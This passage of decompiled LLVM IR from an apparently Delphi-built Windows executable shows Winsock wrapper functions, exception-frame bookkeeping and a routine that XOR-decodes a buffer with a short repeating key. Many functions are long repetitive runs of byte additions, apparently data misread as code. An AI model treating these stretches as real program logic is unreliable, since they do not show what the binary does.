  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ecx = alloca i32, align 4
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = bitcast i32* %ecx to i8*
  %22 = load i8, i8* %21, align 4, !insn.addr !239
  %23 = add i8 %22, %15, !insn.addr !239
  %24 = load i32, i32* %ecx, align 4, !insn.addr !239
  %25 = inttoptr i32 %24 to i8*, !insn.addr !239
  store i8 %23, i8* %25, align 1, !insn.addr !239
  %26 = load i8, i8* %5, align 4, !insn.addr !240
  %27 = load i32, i32* %eax, align 4
  %28 = trunc i32 %27 to i8, !insn.addr !240
  %29 = add i8 %26, %28, !insn.addr !240
  %30 = inttoptr i32 %27 to i8*, !insn.addr !240
  store i8 %29, i8* %30, align 1, !insn.addr !240
  %31 = load i8, i8* %5, align 4, !insn.addr !241
  %32 = load i32, i32* %eax, align 4
  %33 = trunc i32 %32 to i8, !insn.addr !241
  %34 = add i8 %31, %33, !insn.addr !241
  %35 = inttoptr i32 %32 to i8*, !insn.addr !241
  store i8 %34, i8* %35, align 1, !insn.addr !241
  %36 = load i8, i8* %5, align 4, !insn.addr !242
  %37 = load i32, i32* %eax, align 4
  %38 = trunc i32 %37 to i8, !insn.addr !242
  %39 = add i8 %36, %38, !insn.addr !242
  %40 = inttoptr i32 %37 to i8*, !insn.addr !242
  store i8 %39, i8* %40, align 1, !insn.addr !242
  %41 = add i32 %0, -117, !insn.addr !243
  %42 = inttoptr i32 %41 to i8*, !insn.addr !243
  %43 = load i8, i8* %42, align 1, !insn.addr !243
  %44 = trunc i32 %2 to i8, !insn.addr !243
  %45 = add i8 %43, %44, !insn.addr !243
  store i8 %45, i8* %42, align 1, !insn.addr !243
  %46 = trunc i32 %2 to i16, !insn.addr !244
  %47 = call i8 @__asm_in(i16 %46), !insn.addr !244
  %48 = add i32 %20, -8, !insn.addr !245
  %49 = inttoptr i32 %48 to i32*, !insn.addr !245
  store i32 4212417, i32* %49, align 4, !insn.addr !245
  %50 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %51 = add i32 %20, -12, !insn.addr !246
  %52 = inttoptr i32 %51 to i32*, !insn.addr !246
  store i32 %50, i32* %52, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !247
  %53 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %54 = add i32 %53, 1, !insn.addr !248
  %55 = icmp eq i32 %54, 0, !insn.addr !248
  store i32 %54, i32* @global_var_409678, align 4, !insn.addr !248
  %56 = icmp eq i1 %55, false, !insn.addr !249
  br i1 %56, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %57 = call i32 @"@LStrClr"(), !insn.addr !250
  %58 = call i32 @"@LStrClr"(), !insn.addr !251
  %59 = call i32 @"@LStrClr"(), !insn.addr !252
  %60 = call i32 @"@LStrClr"(), !insn.addr !253
  %61 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %62 = add i32 %20, -4, !insn.addr !255
  %63 = inttoptr i32 %62 to i32*, !insn.addr !255
  %64 = load i32, i32* %52, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %64), !insn.addr !257
  store i32 4212424, i32* %63, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404810:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i1 @__decompiler_undefined_function_1()
  %5 = add i32 %1, 117, !insn.addr !322
  %6 = inttoptr i32 %5 to i32*, !insn.addr !322
  %7 = load i32, i32* %6, align 4, !insn.addr !322
  br i1 %4, label %dec_label_pc_404891, label %dec_label_pc_40481b, !insn.addr !323

dec_label_pc_40481b:                              ; preds = %dec_label_pc_404810
  %8 = mul i32 %7, 1616934626, !insn.addr !324
  %9 = add i32 %8, %3, !insn.addr !324
  %10 = inttoptr i32 %9 to i64*, !insn.addr !324
  %11 = load i64, i64* %10, align 4, !insn.addr !324
  %12 = call i32 @__asm_bound(i64 %11), !insn.addr !324
  %13 = bitcast i32* %eax to i8*
  %14 = load i8, i8* %13, align 4, !insn.addr !325
  %15 = load i32, i32* %eax, align 4
  %16 = trunc i32 %15 to i8, !insn.addr !325
  %17 = add i8 %14, %16, !insn.addr !325
  %18 = inttoptr i32 %15 to i8*, !insn.addr !325
  store i8 %17, i8* %18, align 1, !insn.addr !325
  %19 = load i8, i8* %13, align 4, !insn.addr !326
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !326
  %22 = add i8 %19, %21, !insn.addr !326
  %23 = inttoptr i32 %20 to i8*, !insn.addr !326
  store i8 %22, i8* %23, align 1, !insn.addr !326
  %24 = load i8, i8* %13, align 4, !insn.addr !327
  %25 = load i32, i32* %eax, align 4
  %26 = trunc i32 %25 to i8, !insn.addr !327
  %27 = add i8 %24, %26, !insn.addr !327
  %28 = inttoptr i32 %25 to i8*, !insn.addr !327
  store i8 %27, i8* %28, align 1, !insn.addr !327
  %29 = load i8, i8* %13, align 4, !insn.addr !328
  %30 = load i32, i32* %eax, align 4
  %31 = trunc i32 %30 to i8, !insn.addr !328
  %32 = add i8 %29, %31, !insn.addr !328
  %33 = inttoptr i32 %30 to i8*, !insn.addr !328
  store i8 %32, i8* %33, align 1, !insn.addr !328
  %34 = load i8, i8* %13, align 4, !insn.addr !329
  %35 = load i32, i32* %eax, align 4
  %36 = trunc i32 %35 to i8, !insn.addr !329
  %37 = add i8 %34, %36, !insn.addr !329
  %38 = inttoptr i32 %35 to i8*, !insn.addr !329
  store i8 %37, i8* %38, align 1, !insn.addr !329
  %39 = load i8, i8* %13, align 4, !insn.addr !330
  %40 = load i32, i32* %eax, align 4
  %41 = trunc i32 %40 to i8, !insn.addr !330
  %42 = add i8 %39, %41, !insn.addr !330
  %43 = inttoptr i32 %40 to i8*, !insn.addr !330
  store i8 %42, i8* %43, align 1, !insn.addr !330
  %44 = load i8, i8* %13, align 4, !insn.addr !331
  %45 = load i32, i32* %eax, align 4
  %46 = trunc i32 %45 to i8, !insn.addr !331
  %47 = add i8 %44, %46, !insn.addr !331
  %48 = inttoptr i32 %45 to i8*, !insn.addr !331
  store i8 %47, i8* %48, align 1, !insn.addr !331
  %49 = load i8, i8* %13, align 4, !insn.addr !332
  %50 = load i32, i32* %eax, align 4
  %51 = trunc i32 %50 to i8, !insn.addr !332
  %52 = add i8 %49, %51, !insn.addr !332
  %53 = inttoptr i32 %50 to i8*, !insn.addr !332
  store i8 %52, i8* %53, align 1, !insn.addr !332
  %54 = load i8, i8* %13, align 4, !insn.addr !333
  %55 = load i32, i32* %eax, align 4
  %56 = trunc i32 %55 to i8, !insn.addr !333
  %57 = add i8 %54, %56, !insn.addr !333
  %58 = inttoptr i32 %55 to i8*, !insn.addr !333
  store i8 %57, i8* %58, align 1, !insn.addr !333
  %59 = load i8, i8* %13, align 4, !insn.addr !334
  %60 = load i32, i32* %eax, align 4
  %61 = trunc i32 %60 to i8, !insn.addr !334
  %62 = add i8 %59, %61, !insn.addr !334
  %63 = inttoptr i32 %60 to i8*, !insn.addr !334
  store i8 %62, i8* %63, align 1, !insn.addr !334
  %64 = load i8, i8* %13, align 4, !insn.addr !335
  %65 = load i32, i32* %eax, align 4
  %66 = trunc i32 %65 to i8, !insn.addr !335
  %67 = add i8 %64, %66, !insn.addr !335
  %68 = inttoptr i32 %65 to i8*, !insn.addr !335
  store i8 %67, i8* %68, align 1, !insn.addr !335
  %69 = load i8, i8* %13, align 4, !insn.addr !336
  %70 = load i32, i32* %eax, align 4
  %71 = trunc i32 %70 to i8, !insn.addr !336
  %72 = add i8 %69, %71, !insn.addr !336
  %73 = inttoptr i32 %70 to i8*, !insn.addr !336
  store i8 %72, i8* %73, align 1, !insn.addr !336
  %74 = load i8, i8* %13, align 4, !insn.addr !337
  %75 = load i32, i32* %eax, align 4
  %76 = trunc i32 %75 to i8, !insn.addr !337
  %77 = add i8 %74, %76, !insn.addr !337
  %78 = inttoptr i32 %75 to i8*, !insn.addr !337
  store i8 %77, i8* %78, align 1, !insn.addr !337
  %79 = load i8, i8* %13, align 4, !insn.addr !338
  %80 = load i32, i32* %eax, align 4
  %81 = trunc i32 %80 to i8, !insn.addr !338
  %82 = add i8 %79, %81, !insn.addr !338
  %83 = inttoptr i32 %80 to i8*, !insn.addr !338
  store i8 %82, i8* %83, align 1, !insn.addr !338
  %84 = load i8, i8* %13, align 4, !insn.addr !339
  %85 = load i32, i32* %eax, align 4
  %86 = trunc i32 %85 to i8, !insn.addr !339
  %87 = add i8 %84, %86, !insn.addr !339
  %88 = inttoptr i32 %85 to i8*, !insn.addr !339
  store i8 %87, i8* %88, align 1, !insn.addr !339
  %89 = load i8, i8* %13, align 4, !insn.addr !340
  %90 = load i32, i32* %eax, align 4
  %91 = trunc i32 %90 to i8, !insn.addr !340
  %92 = add i8 %89, %91, !insn.addr !340
  %93 = inttoptr i32 %90 to i8*, !insn.addr !340
  store i8 %92, i8* %93, align 1, !insn.addr !340
  %94 = load i8, i8* %13, align 4, !insn.addr !341
  %95 = load i32, i32* %eax, align 4
  %96 = trunc i32 %95 to i8, !insn.addr !341
  %97 = add i8 %94, %96, !insn.addr !341
  %98 = inttoptr i32 %95 to i8*, !insn.addr !341
  store i8 %97, i8* %98, align 1, !insn.addr !341
  %99 = load i8, i8* %13, align 4, !insn.addr !342
  %100 = load i32, i32* %eax, align 4
  %101 = trunc i32 %100 to i8, !insn.addr !342
  %102 = add i8 %99, %101, !insn.addr !342
  %103 = inttoptr i32 %100 to i8*, !insn.addr !342
  store i8 %102, i8* %103, align 1, !insn.addr !342
  %104 = load i8, i8* %13, align 4, !insn.addr !343
  %105 = load i32, i32* %eax, align 4
  %106 = trunc i32 %105 to i8, !insn.addr !343
  %107 = add i8 %104, %106, !insn.addr !343
  %108 = inttoptr i32 %105 to i8*, !insn.addr !343
  store i8 %107, i8* %108, align 1, !insn.addr !343
  %109 = load i8, i8* %13, align 4, !insn.addr !344
  %110 = load i32, i32* %eax, align 4
  %111 = trunc i32 %110 to i8, !insn.addr !344
  %112 = add i8 %109, %111, !insn.addr !344
  %113 = inttoptr i32 %110 to i8*, !insn.addr !344
  store i8 %112, i8* %113, align 1, !insn.addr !344
  %114 = load i32, i32* %eax, align 4
  %115 = xor i32 %114, 58, !insn.addr !345
  ret i32 %115, !insn.addr !345

dec_label_pc_404891:                              ; preds = %dec_label_pc_404810
  %116 = mul i32 %7, 808467313, !insn.addr !322
  %117 = load i32, i32* %eax, align 4
  %118 = inttoptr i32 %117 to i8*, !insn.addr !346
  %119 = load i8, i8* %118, align 1, !insn.addr !346
  %120 = trunc i32 %117 to i8, !insn.addr !346
  %121 = add i8 %119, %120, !insn.addr !346
  store i8 %121, i8* %118, align 1, !insn.addr !346
  %122 = load i32, i32* %eax, align 4
  %123 = inttoptr i32 %122 to i8*, !insn.addr !347
  %124 = load i8, i8* %123, align 1, !insn.addr !347
  %125 = trunc i32 %122 to i8, !insn.addr !347
  %126 = add i8 %124, %125, !insn.addr !347
  store i8 %126, i8* %123, align 1, !insn.addr !347
  %127 = load i32, i32* %eax, align 4
  %128 = inttoptr i32 %127 to i8*, !insn.addr !348
  %129 = load i8, i8* %128, align 1, !insn.addr !348
  %130 = trunc i32 %127 to i8, !insn.addr !348
  %131 = add i8 %129, %130, !insn.addr !348
  store i8 %131, i8* %128, align 1, !insn.addr !348
  %132 = add i32 %2, %0, !insn.addr !349
  %133 = inttoptr i32 %132 to i8*, !insn.addr !349
  %134 = load i8, i8* %133, align 1, !insn.addr !349
  %135 = udiv i32 %2, 256, !insn.addr !349
  %136 = trunc i32 %135 to i8, !insn.addr !349
  %137 = add i8 %134, %136, !insn.addr !349
  store i8 %137, i8* %133, align 1, !insn.addr !349
  %138 = load i32, i32 addrspace(258)* inttoptr (i32 892745012 to i32 addrspace(258)*), align 4, !insn.addr !350
  %139 = icmp ult i32 %138, %116, !insn.addr !350
  %140 = load i32, i32* %eax, align 4
  %141 = inttoptr i32 %140 to i8*
  %142 = load i8, i8* %141, align 1
  %143 = trunc i32 %140 to i8
  %144 = add i8 %142, %143
  store i8 %144, i8* %141, align 1
  %145 = load i32, i32* %eax, align 4
  %146 = inttoptr i32 %145 to i8*
  %147 = load i8, i8* %146, align 1
  %148 = trunc i32 %145 to i8
  %149 = add i8 %147, %148
  store i8 %149, i8* %146, align 1
  %150 = load i32, i32* %eax, align 4
  %151 = inttoptr i32 %150 to i8*
  %152 = load i8, i8* %151, align 1
  %153 = trunc i32 %150 to i8
  %154 = add i8 %152, %153
  store i8 %154, i8* %151, align 1
  %155 = load i32, i32* %eax, align 4
  %156 = inttoptr i32 %155 to i8*
  %157 = load i8, i8* %156, align 1
  %158 = trunc i32 %155 to i8
  %159 = add i8 %157, %158
  store i8 %159, i8* %156, align 1
  %160 = load i32, i32* %eax, align 4
  %161 = inttoptr i32 %160 to i8*
  %162 = load i8, i8* %161, align 1
  %163 = trunc i32 %160 to i8
  %164 = add i8 %162, %163
  br i1 %139, label %dec_label_pc_404916, label %dec_label_pc_4048a4, !insn.addr !351

dec_label_pc_4048a4:                              ; preds = %dec_label_pc_404891
  store i8 %164, i8* %161, align 1, !insn.addr !352
  %165 = load i32, i32* %eax, align 4
  %166 = inttoptr i32 %165 to i8*, !insn.addr !353
  %167 = load i8, i8* %166, align 1, !insn.addr !353
  %168 = trunc i32 %165 to i8, !insn.addr !353
  %169 = add i8 %167, %168, !insn.addr !353
  store i8 %169, i8* %166, align 1, !insn.addr !353
  %170 = load i32, i32* %eax, align 4
  %171 = inttoptr i32 %170 to i8*, !insn.addr !354
  %172 = load i8, i8* %171, align 1, !insn.addr !354
  %173 = trunc i32 %170 to i8, !insn.addr !354
  %174 = add i8 %172, %173, !insn.addr !354
  store i8 %174, i8* %171, align 1, !insn.addr !354
  %175 = load i32, i32* %eax, align 4
  %176 = inttoptr i32 %175 to i8*, !insn.addr !355
  %177 = load i8, i8* %176, align 1, !insn.addr !355
  %178 = trunc i32 %175 to i8, !insn.addr !355
  %179 = add i8 %177, %178, !insn.addr !355
  store i8 %179, i8* %176, align 1, !insn.addr !355
  %180 = load i32, i32* %eax, align 4
  %181 = inttoptr i32 %180 to i8*, !insn.addr !356
  %182 = load i8, i8* %181, align 1, !insn.addr !356
  %183 = trunc i32 %180 to i8, !insn.addr !356
  %184 = add i8 %182, %183, !insn.addr !356
  store i8 %184, i8* %181, align 1, !insn.addr !356
  %185 = load i32, i32* %eax, align 4
  %186 = inttoptr i32 %185 to i8*, !insn.addr !357
  %187 = load i8, i8* %186, align 1, !insn.addr !357
  %188 = trunc i32 %185 to i8, !insn.addr !357
  %189 = add i8 %187, %188, !insn.addr !357
  store i8 %189, i8* %186, align 1, !insn.addr !357
  %190 = load i32, i32* %eax, align 4
  %191 = inttoptr i32 %190 to i8*, !insn.addr !358
  %192 = load i8, i8* %191, align 1, !insn.addr !358
  %193 = trunc i32 %190 to i8, !insn.addr !358
  %194 = add i8 %192, %193, !insn.addr !358
  store i8 %194, i8* %191, align 1, !insn.addr !358
  %195 = load i32, i32* %eax, align 4
  %196 = inttoptr i32 %195 to i8*, !insn.addr !359
  %197 = load i8, i8* %196, align 1, !insn.addr !359
  %198 = trunc i32 %195 to i8, !insn.addr !359
  %199 = add i8 %197, %198, !insn.addr !359
  store i8 %199, i8* %196, align 1, !insn.addr !359
  %200 = load i32, i32* %eax, align 4
  %201 = inttoptr i32 %200 to i8*, !insn.addr !360
  %202 = load i8, i8* %201, align 1, !insn.addr !360
  %203 = trunc i32 %200 to i8, !insn.addr !360
  %204 = add i8 %202, %203, !insn.addr !360
  store i8 %204, i8* %201, align 1, !insn.addr !360
  %205 = load i32, i32* %eax, align 4
  %206 = inttoptr i32 %205 to i8*, !insn.addr !361
  %207 = load i8, i8* %206, align 1, !insn.addr !361
  %208 = trunc i32 %205 to i8, !insn.addr !361
  %209 = add i8 %207, %208, !insn.addr !361
  store i8 %209, i8* %206, align 1, !insn.addr !361
  %210 = load i32, i32* %eax, align 4
  %211 = inttoptr i32 %210 to i8*, !insn.addr !362
  %212 = load i8, i8* %211, align 1, !insn.addr !362
  %213 = trunc i32 %210 to i8, !insn.addr !362
  %214 = add i8 %212, %213, !insn.addr !362
